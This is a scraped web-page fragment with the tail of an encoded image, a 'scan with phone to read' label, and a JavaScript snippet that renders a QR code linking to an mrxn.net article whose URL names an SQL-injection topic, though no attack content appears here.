lyj+thZPVgLnEm2j6hwzAONh93PekIwL1+WBeTLElcE11QuPhxzcIylWzdEp/BG1gaiid+1fv+p63nFVznlZXB8UmY1M0614YWKZ6acDLwOzD8KqxZ2jeJq4Fzlel/ryHq+xuA+0snAMbA+9n682Ve7IdkX7NOCox/NHQTX9lo9EbHk+hjGWjhy4BhGTN8gWJNYCOaydlC53uCoBcdVB+bgiFXTrwHWhhcOA6kNlv/3J7AG8vdnfrnijwwExquXVcG5PgZCtY+fjfh0gCGna/1V+2x3gPQICV4rfMVek3iGqUsusTBcUJwMvDaw3tQ/3uzrR27I1c+kJ0B2RyNdtVoTHvw0JQeOgVCnmB7CMxHQbiXYl152VlN5+HqNesd+fSB1s8t/fgLDQDKpGZ61ixb8dACDNJoh8SCA7al8uLdfcF4DzoExTcEx7Jjc1f7uaO7Un/WBfT/DQFK08DUn0AYC+5Tg2r+z1Twx4F6pCS/sOThqk6+oOlk4+TFwfeJoguErJjfD6MB9wRh+VhMOrIUd+1zi9BO2gSS58LUnsAby2vMfVv8fAAAA///wqkAQAAAABklEQVQDAC2GsZgCiP8wAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-doPageptpinfo-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 